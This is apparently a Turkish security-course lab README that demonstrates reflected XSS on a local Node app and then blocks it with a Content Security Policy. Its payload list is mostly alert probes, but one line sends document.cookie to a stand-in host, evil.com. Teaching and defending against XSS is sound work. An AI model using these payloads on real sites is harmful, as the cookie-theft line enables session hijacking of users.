# Görev 3 — XSS + CSP

## Amaç
Cross-Site Scripting (XSS) açığını göstermek ve Content Security Policy ile engellemek.

## XSS Türleri

| Tür | Açıklama | Örnek |
|-----|----------|-------|
| Reflected | URL'den gelen veri yansıtılır | `?q=<script>alert(1)</script>` |
| Stored | Veritabanına kaydedilir | Yorum alanına script |
| DOM-based | Client-side JS ile tetiklenir | `document.write(location.hash)` |

## Payload Örnekleri

```
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>document.location='http://evil.com/steal?c='+document.cookie</script>
<body onload=alert(1)>
javascript:alert(1)
```

## Adımlar

1. `npm install && node app.js`
2. `http://localhost:3000/search?q=<script>alert('XSS')</script>` — XSS çalışır
3. `node app-safe.js` — CSP aktif
4. Aynı payload — CSP tarafından engellenir
5. Tarayıcı konsolunda CSP ihlal mesajı görünür

## Savunma
- Input sanitization (DOMPurify)
- Output encoding
- Content Security Policy header
- HttpOnly cookie flag

## Ekran Görüntüsü Açıklaması
> Zaafiyetli versiyonda alert kutusu açılır. Güvenli versiyonda tarayıcı konsolunda "Refused to execute inline script" CSP hatası görünür.
